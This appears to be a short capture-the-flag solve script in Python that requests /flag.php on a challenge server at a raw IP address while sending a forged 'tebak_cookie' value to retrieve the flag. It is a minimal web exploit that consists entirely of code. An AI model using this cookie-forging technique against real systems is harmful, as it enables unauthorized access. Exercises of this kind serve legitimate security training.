import requests
from bs4 import BeautifulSoup

url = 'http://165.22.245.125:7879'
index = '/flag.php'
cookies = {'tebak_cookie' : 'random_sha256_yang_di_run_1_kali_saja_static'}

response = requests.get(url + index, cookies=cookies, allow_redirects=False)
print(response.text)